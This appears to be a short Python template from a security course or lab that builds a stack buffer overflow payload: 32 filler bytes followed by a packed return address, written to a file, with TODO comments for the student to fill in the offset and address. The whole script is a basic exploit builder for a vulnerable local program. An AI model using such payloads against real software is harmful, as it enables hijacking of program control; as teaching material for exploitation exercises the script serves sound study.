import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

# TODO: Fill this with offset to return address location.
offset = 32

# TODO: Fill this with the value that overwrites the return address.
ret_addr = 0x08048443

# Initialize payload.
payload = ''

# Add a number of 'offset' A characters to the payload.
payload += 'A' * offset

# Add the return address value to the end of the payload.
payload += dw(ret_addr)

with open('payload', 'wb') as f:
    f.write(payload)
